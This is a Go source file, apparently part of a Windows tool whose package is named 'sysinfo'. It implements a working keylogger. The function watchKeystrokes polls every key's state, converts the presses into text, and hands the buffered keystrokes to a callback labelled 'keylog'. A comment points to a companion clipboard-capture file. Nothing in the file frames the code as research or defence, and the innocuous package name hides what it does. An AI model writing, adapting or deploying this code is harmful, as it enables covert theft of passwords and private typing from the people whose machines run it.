//go:build windows
// +build windows

package sysinfo

import (
	"bytes"
	"context"
	"syscall"
	"time"
	"unsafe"
)

var (
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procGetKeyState      = user32.NewProc("GetKeyState")
	procMapVirtualKeyW   = user32.NewProc("MapVirtualKeyW")
	procToUnicode        = user32.NewProc("ToUnicode")
	procGetKeyboardState = user32.NewProc("GetKeyboardState")
)

func watchKeystrokes(ctx context.Context, onData func(data []byte, label string)) error {
	var buf bytes.Buffer
	lastFlush := time.Now()
	ticker := time.NewTicker(10 * time.Millisecond)
	defer ticker.Stop()

	var kbState [256]byte

	for {
		select {
		case <-ctx.Done():
			if buf.Len() > 0 {
				onData(buf.Bytes(), "keylog")
			}
			return ctx.Err()
		case <-ticker.C:
			for vk := 8; vk < 255; vk++ {
				ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
				if ret&0x0001 == 0 {
					continue
				}

				procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
				scanCode, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)

				var unicodeBuf [4]uint16
				n, _, _ := procToUnicode.Call(
					uintptr(vk), scanCode,
					uintptr(unsafe.Pointer(&kbState[0])),
					uintptr(unsafe.Pointer(&unicodeBuf[0])),
					4, 0)

				if n > 0 {
					ch := unicodeBuf[0]
					if ch == '\r' {
						ch = '\n'
					}
					if ch == '\n' || time.Since(lastFlush) > 5*time.Second {
						if buf.Len() > 0 {
							buf.WriteByte('\n')
							onData(buf.Bytes(), "keylog")
							buf.Reset()
						}
						lastFlush = time.Now()
					} else if ch >= 32 && ch < 127 {
						buf.WriteByte(byte(ch))
					}
				}
			}
		}
	}
}

// Ensure the lazy DLL procs are resolved via the user32 DLL already loaded
// in clipboard_windows.go.
func init() {
	_ = syscall.NewLazyDLL("user32.dll")
}
